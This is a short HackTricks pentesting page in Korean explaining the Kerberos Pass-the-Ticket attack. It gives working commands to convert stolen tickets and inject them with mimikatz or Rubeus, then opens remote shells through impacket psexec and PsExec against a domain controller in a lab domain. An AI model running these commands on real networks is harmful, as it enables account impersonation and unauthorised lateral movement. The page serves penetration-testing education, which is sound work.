# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

**Pass The Ticket (PTT)** 공격 방법에서 공격자는 **사용자의 인증 티켓을 훔칩니다**. 이 훔친 티켓은 **사용자를 가장하는 데 사용되어** 네트워크 내의 리소스와 서비스에 무단으로 접근하게 됩니다.

**읽기**:

- [Windows에서 티켓 수집하기](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux에서 티켓 수집하기](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **플랫폼 간 Linux와 Windows 티켓 교환하기**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) 도구는 티켓 자체와 출력 파일만을 사용하여 티켓 형식을 변환합니다.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windows에서 [Kekeo](https://github.com/gentilkiwi/kekeo)를 사용할 수 있습니다.

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## 참고 문헌

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
